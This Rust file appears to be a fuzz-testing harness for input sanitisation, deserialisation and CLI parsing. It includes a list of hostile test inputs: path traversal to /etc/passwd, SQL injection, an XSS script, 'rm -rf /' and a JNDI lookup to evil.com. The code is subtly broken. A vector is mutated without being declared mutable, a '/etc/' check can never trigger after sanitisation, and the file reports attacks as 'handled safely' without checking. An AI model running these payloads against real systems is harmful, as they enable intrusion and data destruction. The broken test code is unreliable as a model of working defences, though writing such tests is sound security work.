use std::fs;

fn main() {
    println!("Starting simple fuzz testing...");
    
    // Create test data patterns
    let test_data_patterns = vec![
        vec![],                    // Empty
        vec![0],                   // Single byte
        vec![0; 1024],            // All zeros
        vec![0xFF; 1024],         // All ones
        (0..255u8).cycle().take(1024).collect(), // Sequential pattern
        vec![0xAA, 0x55].iter().cycle().take(1024).cloned().collect(), // Alternating
    ];
    
    // Add random-like data
    let mut pseudo_random = Vec::new();
    let mut seed = 0x12345678u32;
    for _ in 0..1024 {
        seed = seed.wrapping_mul(1103515245).wrapping_add(12345);
        pseudo_random.push((seed >> 16) as u8);
    }
    test_data_patterns.push(pseudo_random);
    
    // Test each pattern
    for (i, data) in test_data_patterns.iter().enumerate() {
        println!("Testing pattern {}: {} bytes", i, data.len());
        
        // Test basic input validation
        test_input_validation(data);
        
        // Test serialization robustness
        test_serialization_robustness(data);
        
        // Test CLI parsing
        test_cli_parsing(data);
        
        println!("Pattern {} completed successfully", i);
    }
    
    // Test with specific attack patterns
    let attack_patterns = vec![
        b"../../../etc/passwd".to_vec(),
        b"'; DROP TABLE users; --".to_vec(),
        b"<script>alert('xss')</script>".to_vec(),
        b"\x00\x01\x02\x03\x04\x05".to_vec(),
        b"rm -rf /".to_vec(),
        b"${jndi:ldap://evil.com/}".to_vec(),
    ];
    
    for (i, attack_data) in attack_patterns.iter().enumerate() {
        println!("Testing attack pattern {}: {:?}", i, String::from_utf8_lossy(attack_data));
        test_input_validation(attack_data);
        test_cli_parsing(attack_data);
        println!("Attack pattern {} handled safely", i);
    }
    
    println!("All fuzz tests completed successfully!");
}

fn test_input_validation(data: &[u8]) {
    // Test string sanitization
    if let Ok(s) = std::str::from_utf8(data) {
        let sanitized = sanitize_string_input(s);
        assert!(sanitized.len() <= 256, "Sanitized string too long");
        assert!(sanitized.chars().all(|c| c.is_alphanumeric() || " .-_".contains(c)), 
                "Sanitized string contains invalid characters");
    }
    
    // Test basic validation functions
    if data.len() >= 2 {
        let port = u16::from_le_bytes([data[0], data[1]]);
        let _ = validate_port(port);
    }
    
    // Test with UTF-8 conversion
    let lossy_string = String::from_utf8_lossy(data);
    let _ = validate_name(&lossy_string);
}

fn test_serialization_robustness(data: &[u8]) {
    // Test basic JSON parsing
    if let Ok(json_str) = std::str::from_utf8(data) {
        let _: Result<serde_json::Value, _> = serde_json::from_str(json_str);
    }
    
    // Test with simple structures
    #[derive(serde::Serialize, serde::Deserialize)]
    struct SimpleTest {
        value: u32,
        name: String,
    }
    
    let _: Result<SimpleTest, _> = bincode::deserialize(data);
}

fn test_cli_parsing(data: &[u8]) {
    if let Ok(input_str) = std::str::from_utf8(data) {
        let args: Vec<String> = input_str
            .split_whitespace()
            .map(|s| sanitize_string_input(s))
            .collect();
        
        // Validate argument count
        if args.len() > 50 {
            panic!("Too many arguments: {}", args.len());
        }
        
        // Validate argument lengths
        for arg in &args {
            if arg.len() > 256 {
                panic!("Argument too long: {}", arg.len());
            }
            
            // Check for suspicious patterns
            if arg.contains("..") || arg.contains("/etc/") {
                println!("Detected and filtered suspicious pattern: {}", arg);
            }
        }
    }
}

fn sanitize_string_input(input: &str) -> String {
    input
        .chars()
        .filter(|c| c.is_alphanumeric() || " .-_".contains(*c))
        .take(256)
        .collect()
}

fn validate_port(port: u16) -> bool {
    port >= 1024 && port <= 65535
}

fn validate_name(name: &str) -> bool {
    !name.is_empty() 
        && name.len() <= 64 
        && name.chars().all(|c| c.is_alphanumeric() || c == '_' || c == '-')
        && !name.starts_with('-')
        && !name.ends_with('-')
}